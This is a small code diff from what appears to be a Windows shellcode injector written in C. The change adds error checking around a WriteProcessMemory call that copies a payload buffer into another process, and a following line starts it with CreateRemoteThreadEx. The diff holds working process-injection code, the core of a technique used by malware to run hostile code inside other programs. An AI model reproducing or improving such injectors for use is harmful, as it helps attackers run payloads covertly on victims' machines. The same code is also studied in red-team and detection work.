@@ -80,8 +80,14 @@ int main(int argc, char* argv[]) {
   }
 
   /* WRITE TO PROCESS VIRTUAL MEM */
-  WriteProcessMemory(hProcess, rBuffer, shellPuke, sizeof(shellPuke), NULL);
-  printf("%s wrote %zu-bytes to process memory\n", k, sizeof(shellPuke));
+  if(0 == WriteProcessMemory(hProcess, rBuffer, shellPuke, sizeof(shellPuke), NULL)) {
+    // write fail
+    printf("%s could not write to process memory! error %ld", e, GetLastError());
+    return EXIT_FAILURE;
+  } else {
+    // write success
+    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(shellPuke));
+  }
 
   /* CREATE THREAD TO RUN PAYLOAD */
   hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
